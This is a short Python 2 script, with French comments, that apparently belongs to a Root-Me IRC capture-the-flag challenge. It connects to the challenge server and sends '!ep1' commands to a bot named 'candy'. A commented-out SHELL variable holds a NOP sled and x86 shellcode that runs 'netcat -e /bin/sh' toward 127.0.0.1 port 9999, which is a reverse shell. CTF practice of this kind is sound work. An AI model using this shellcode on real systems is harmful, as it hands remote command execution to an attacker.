#!/usr/bin/env python

import socket
import struct
import telnetlib
import time
#import irclib

#creation des variables utiles______________________

HOST = "irc.root-me.org";
PORT = 6667
NICK = "NIC";
CHANNEL = "#root-me_challenge";
TARGET = "candy";
#TARGET = "NIC2"
# SHELL="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
#_____________________________________________________

def sendMessage(target , msg):
  s.send("PRIVMSG "+ target +" :"+ msg +"\r\n");

#on se connecte au bot
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect((HOST, PORT));

time.sleep(2);

s.send("NICK %s\r\n" % NICK);
s.send("USER "+ NICK +" "+ NICK +" "+ NICK +" :NIC2\r\n");
time.sleep(1);
s.send("JOIN "+ CHANNEL +"\r\n");

time.sleep(4);
print('__________________________________________________________________');
print s.recv(1024);

time.sleep(4);

print('__________________________________________________________________');
print s.recv(4096);

p1 = "!ep1" ;
sendMessage(TARGET, p1);
time.sleep(1);


print('__________________________________________________________________');

print s.recv(128);

p1 = "!ep1 -rep 0" ;
sendMessage(TARGET, p1);
time.sleep(2);

tt = s.recv(8192);

time.sleep(2);
print('-- --');
print tt;